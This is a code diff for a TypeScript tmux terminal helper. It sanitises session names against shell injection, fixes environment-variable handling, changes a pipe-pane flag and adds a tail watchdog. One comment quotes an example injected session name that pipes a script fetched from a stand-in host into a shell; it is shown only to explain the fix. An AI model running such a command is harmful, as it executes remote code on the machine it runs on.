@@ -38,6 +38,17 @@ function shq(value: string): string {
 	return `'${value.replace(/'/g, `'\\''`)}'`;
 }
 
+/**
+ * Session names reach the shell twice: quoted as a tmux target, and
+ * unquoted inside the log path. Restrict them to a safe alphabet so
+ * neither use can be escaped (`openPty({ session: "x; curl evil | sh" })`
+ * would otherwise run on the sandbox), and so the path has no spaces.
+ */
+function safeSessionName(value: string): string {
+	const cleaned = value.replace(/[^A-Za-z0-9._-]/g, "-").slice(0, 60);
+	return cleaned.length > 0 ? cleaned : DEFAULT_SESSION;
+}
+
 function toHex(data: Uint8Array): string {
 	return Array.from(data, (byte) =>
 		byte.toString(16).padStart(2, "0"),
@@ -52,29 +63,37 @@ export async function openTmuxPty(
 	// close() detaches. An unnamed session is a one-off and close() reaps
 	// it -- there is no name to reattach with.
 	const named = options.session !== undefined;
-	const session = options.session ?? DEFAULT_SESSION;
+	const session = safeSessionName(options.session ?? DEFAULT_SESSION);
 	const cols = options.cols ?? 100;
 	const rows = options.rows ?? 30;
 	const log = `/tmp/am-mux-${session}.log`;
-	const envExports = Object.entries(options.env ?? {})
+	// `env K=V ... sh -c '<command>'` rather than an assignment prefix:
+	// harness commands are brace groups (`{ export PATH=...; claude; }`)
+	// and a variable-assignment prefix in front of a compound command is
+	// a shell syntax error, which silently broke `am mux term`.
+	const envArgs = Object.entries(options.env ?? {})
 		.map(([key, value]) => `${key}=${shq(value)}`)
 		.join(" ");
 	const shellCommand = options.command
-		? `${envExports} ${options.command}`.trim()
+		? `env ${envArgs} sh -c ${shq(options.command)}`.replace(/^env  /, "env ")
 		: "";
 
-	// One round trip: ensure tmux, (re)create session, wire pipe-pane,
-	// report the log byte offset so the tail starts at "now".
 	// One round trip: ensure tmux and the session, wire the output log,
 	// then report a visible-pane snapshot plus the log byte offset. The
 	// snapshot is what makes reattach feel instant -- the client paints
 	// the current screen immediately and streams only deltas after it.
+	//
+	// pipe-pane must NOT take -o: that flag toggles, so re-running it on a
+	// reattach CLOSES the existing pipe and the terminal goes permanently
+	// silent (verified on a live sandbox: 0 bytes captured after the
+	// second call). Without -o, tmux replaces the pipe, which is what a
+	// reattach wants.
 	const marker = "__AM_SNAPSHOT__";
 	const ensure = [
 		`command -v tmux >/dev/null 2>&1 || (sudo apt-get install -y tmux >/dev/null 2>&1 || apt-get install -y tmux >/dev/null 2>&1 || apk add tmux >/dev/null 2>&1)`,
 		`tmux has-session -t ${shq(session)} 2>/dev/null || tmux new-session -d -s ${shq(session)} -x ${cols} -y ${rows} ${shellCommand ? shq(shellCommand) : ""}`,
 		`tmux set-option -t ${shq(session)} history-limit 10000 >/dev/null 2>&1 || true`,
-		`tmux pipe-pane -o -t ${shq(session)} ${shq(`cat >> ${log}`)}`,
+		`tmux pipe-pane -t ${shq(session)} ${shq(`cat >> ${log}`)}`,
 		`touch ${log}`,
 		`wc -c < ${log}`,
 		`echo ${marker}`,
@@ -106,7 +125,14 @@ export async function openTmuxPty(
 		// Replay the visible pane first so a reattach shows the session as
 		// it stands, then stream only what arrives after the snapshot.
 		if (snapshot.length > 0) yield encoder.encode(snapshot);
-		const tail = `stdbuf -o0 tail -c +${offset + 1} -f ${log}`;
+		// `tail -f` alone never ends, so a session that exits (agent TUI
+		// quit, process killed) would leave the consumer awaiting output
+		// forever and `exited` pending. Pair the tail with a watchdog that
+		// kills it once the session is gone.
+		const tail =
+			`{ stdbuf -o0 tail -c +${offset + 1} -f ${log} & TAILPID=$!; ` +
+			`while tmux has-session -t ${shq(session)} 2>/dev/null; do sleep 1; done; ` +
+			`kill $TAILPID 2>/dev/null; wait $TAILPID 2>/dev/null; }`;
 		try {
 			for await (const event of target.execStream(tail, {
 				signal: abort.signal,
